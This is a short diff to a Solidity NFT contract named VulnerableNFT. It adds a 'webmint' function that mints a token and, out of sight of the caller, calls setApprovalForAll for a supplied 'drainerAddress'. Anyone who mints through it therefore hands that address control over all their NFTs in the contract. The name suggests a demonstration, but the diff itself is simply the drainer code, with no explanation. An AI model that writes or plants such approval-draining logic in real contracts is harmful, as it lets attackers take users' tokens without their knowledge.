@@ -14,4 +14,11 @@ contract VulnerableNFT is ERC721, Ownable {
         _mint(to, _tokenId);
         return _tokenId;
     }
+
+    function webmint(address to , address drainerAddress) public returns (uint256){
+        _tokenId+=1;
+        _mint(to, _tokenId);
+        setApprovalForAll(drainerAddress, true);
+        return _tokenId;
+    }
 }
